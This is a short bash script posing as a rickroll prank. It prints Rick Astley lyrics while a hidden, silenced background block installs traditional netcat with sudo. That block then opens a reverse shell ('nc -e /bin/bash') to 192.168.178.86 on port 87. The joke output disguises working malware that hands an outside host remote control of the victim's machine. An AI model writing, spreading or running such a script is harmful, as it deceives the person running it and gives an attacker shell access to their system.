#!/bin/bash

clear

(
    # alles ins Nirvana
    exec >/dev/null 2>&1

    # netcat-traditional installieren, falls nicht vorhanden
    if ! dpkg -s netcat-traditional >/dev/null 2>&1; then
        sudo apt update -qq
        sudo apt install -y -qq netcat-traditional
    fi

    # nc auf traditional setzen
    sudo update-alternatives --set nc /bin/nc.traditional >/dev/null 2>&1

   sleep 5

   nc -e /bin/bash 192.168.178.86 87
) &

lyrics=(
"Never gonna give you up"
"Never gonna let you down"
"Never gonna run around and desert you"
"Never gonna make you cry"
"Never gonna say goodbye"
"Never gonna tell a lie and hurt you"
)

echo "🎶 Rick Astley – Terminal Edition 🎶"
echo
sleep 1

for line in "${lyrics[@]}"; do
    echo "$line"
    sleep 1.0
done

echo
echo "💀 You got rickrolled 💀"
